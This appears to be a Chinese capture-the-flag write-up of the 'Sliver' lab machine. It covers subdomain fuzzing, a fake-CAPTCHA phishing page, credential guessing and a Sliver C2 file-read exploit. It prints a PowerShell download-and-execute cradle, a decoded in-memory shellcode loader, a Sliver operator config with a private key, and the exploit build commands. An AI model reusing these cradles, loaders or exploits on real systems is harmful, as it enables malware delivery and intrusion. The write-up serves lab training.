---
title: 'Sliver'
date: 2026-02-23 14:56:29 +0800
categories:
  - 渗透练习
  - mazesec
tags:
  - Sliver
---
## Sliver

扫端口的时候发现有证书 ***.silver.maze，端口上也啥都没有，估计是要爆破子域名

```bash
ffuf -u https://sliver.maze -H "Host: FUZZ.sliver.maze" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k -ac
```

这个见过，是一个人机验证的钓鱼

![image-20260217201334678](/assets/img/posts/sliver/image-20260217201334678.png)

复制出来

```
powershell -ep bypass -enc 
```

解码，得到了c2地址和马的下载地址

```bash
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
IEX ((new-object net.webclient).downloadstring('https://ze57l521ajny1hp6.sliver.maze/mb79h3haun7y4e3a/api/public/dl/w0HDuFb2'))
```

拖下来解码

```powershell
$originalBytes = [Text.Encoding]::ASCII.GetBytes('')
$shuffledBytes = $originalBytes | Sort-Object { Get-Random -SetSeed 1594585612 }
$shuffledString = [Text.Encoding]::ASCII.GetString($shuffledBytes)
```

但是解码也只能看到 shellcode 是在运行计算器

```powershell

[Byte[]] $shellcode = @(0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
            0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
            0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
            0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
            0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
            0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
            0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3)

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}} 
    $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        Write-Host "First Invoke - $moduleName $functionName";
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        Write-Host "Second Invoke - $moduleName $functionName";
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }
    return $result;
}

function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType() 
}
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc),(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $lpMem, $shellcode.Length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),(getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

看来方向错了，在这里浪费了好多时间

回到前面那个路由，有个随机的路由名称，然后后面跟api，[难道这上面有东西](https://ze57l521ajny1hp6.sliver.maze/mb79h3haun7y4e3a)

结果还真有

![image-20260219193442561](/assets/img/posts/sliver/image-20260219193442561.png)

做的时候一直卡在这里，直到群里头提示随机字符串

我真的是脑洞大开了，才能想到用户名密码 `qiaojojo:ze57l521ajny1hp6` 这也太抽象了吧

能拿到一个 qiaojojo_localhost.cfg

```json
{"operator":"qiaojojo","token":"ec254fb9ba9fb4b9ecc1afc571c32e581841be07056c5766460da1dc58a2479a","lhost":"localhost","lport":31337,"ca_certificate":"-----BEGIN CERTIFICATE-----\nMIIB2TCCAWCgAwIBAgIQXY/4xV4LNC9PTP7IJ0IzgzAKBggqhkjOPQQDAzAUMRIw\nEAYDVQQDEwlvcGVyYXRvcnMwHhcNMjUxMDIyMTQzODI5WhcNMjcxMDIyMTQzODI5\nWjAUMRIwEAYDVQQDEwlvcGVyYXRvcnMwdjAQBgcqhkjOPQIBBgUrgQQAIgNiAAR5\n6fmTUlFvV8O/9RqVBgncU1I1uKjuooq65Fu4QI5B4l1G8Rp3un2q6APfT79SpVFt\niDnwNwki/Bf832SorSBKoFV7DWZn2NB/uqdQhJMgdFgmVUxA2mPfpsSCCYaqGx6j\ndzB1MA4GA1UdDwEB/wQEAwICpDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUH\nAwIwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQU8L4gf7xbQsi3Ix8hH1blLAWK\nb+QwFAYDVR0RBA0wC4IJb3BlcmF0b3JzMAoGCCqGSM49BAMDA2cAMGQCMA6YpdoK\nUyVVqp4rxiyXbvZyntewaVrbBwtqQFx2A2aedjAFz5Y3v7tTFU516hR/xAIwTQhC\nk30y7hORWQT0UP0tRv+vMJD+DaH6jorRSGqc2jltsC0vQUM0ItyseKOsS9SN\n-----END CERTIFICATE-----\n","private_key":"-----BEGIN EC PRIVATE KEY-----\nMIGkAgEBBDCUAsvZc59789bROOhk0IfHTpqclgytRa3mtSo8ZuvKkdjhc9B9y2bB\nvbNcFTn5M1CgBwYFK4EEACKhZANiAAQ0efkmDkWH4ng61lHNo1x/PtQo8CYaRfAR\nyLeKv92QjqMdt2pGT0g7pOSNfwBcyvZNJBf0Q7MzsFStD2A7EB7kb6TpjWUj3QeC\nykPNpmLONfPFDvpZDSlgHuu/MQM6FEo=\n-----END EC PRIVATE KEY-----\n","certificate":"-----BEGIN CERTIFICATE-----\nMIIBqzCCATGgAwIBAgIRAM3Teoal/vg/PvDFAJ6oD0EwCgYIKoZIzj0EAwMwFDES\nMBAGA1UEAxMJb3BlcmF0b3JzMB4XDTI2MDExMDE1MDYzNVoXDTI4MDExMDE1MDYz\nNVowEzERMA8GA1UEAxMIcWlhb2pvam8wdjAQBgcqhkjOPQIBBgUrgQQAIgNiAAQ0\nefkmDkWH4ng61lHNo1x/PtQo8CYaRfARyLeKv92QjqMdt2pGT0g7pOSNfwBcyvZN\nJBf0Q7MzsFStD2A7EB7kb6TpjWUj3QeCykPNpmLONfPFDvpZDSlgHuu/MQM6FEqj\nSDBGMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDAjAfBgNVHSME\nGDAWgBTwviB/vFtCyLcjHyEfVuUsBYpv5DAKBggqhkjOPQQDAwNoADBlAjEA2HC5\nUujSH3bFUvWZTNJsPQudQ8RjIVxBPJlyegkfudzIUAb8Nrs5dtVkz3YPXa4VAjAa\nJ+MjMDjswKDweg+VsrFQftm5gtarKUcXk3mx3lfT67wPCrNi/1TZk51FISBo8Eg=\n-----END CERTIFICATE-----\n"}
```

但是这个sliver貌似只开在本地，31337端口上不去，看来得往sublarge的方向找

无敌了，密码是 `sublarge:mb79h3haun7y4e3a`

上去是管理员，发现目录是 /files，那如果我改成 / 呢

![image-20260220115040303](/assets/img/posts/sliver/image-20260220115040303.png)

果然，这里对应的应该是 /home/sublarge

```
flag{user-1026880a-ac96-42b8-83f7-49bd429b43fb}
```

![image-20260220115055613](/assets/img/posts/sliver/image-20260220115055613.png)

很诡异，没有用户目录下的那些文件，创建 .ssh 文件夹也没反应，我再换回 qiaojojo 用户呢

果然，写公钥ssh登录

![image-20260220120042616](/assets/img/posts/sliver/image-20260220120042616.png)

sliver还没用过，传一个client上去

```bash
./sliver-client import /home/sublarge/files/operators/qiaojojo/qiaojojo_localhost.cfg
./sliver-client
```

这里真的做了特别久，一直想的都是做一个马然后上线自己，看有没有权限进root

但是一直编译不成功，又想着在本地构建一个回连localhost的马，然后传上去执行，但是由于证书的问题，靶机没法用本地构建的马

最后实在实在是没办法了，结果grok提示有sliver[任意文件读取的漏洞](https://github.com/BishopFox/sliver/security/advisories/GHSA-2286-hxv5-cmp2)，刚好发现靶机的版本是1.6.0，存在这个漏洞

但是靶机缺乏依赖，那就在本地编译并上传，最后成功读到了 root.txt

```bash
mkdir sliver_poc && cd sliver_poc
# 把你的代码保存为 main.go
go mod init sliver_poc
#获取依赖 (这一步需要联网)
go get github.com/bishopfox/sliver@master
go mod tidy
#静态编译
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o exploit main.go
#上传执行
./exploit -config /home/sublarge/files/operators/qiaojojo/qiaojojo_localhost.cfg -website test-site -target /root/root.txt
```

![image-20260223144745795](/assets/img/posts/sliver/image-20260223144745795.png)



这个cfg让我觉得肯定是要连到server然后自己上线，没想到是直接的漏洞
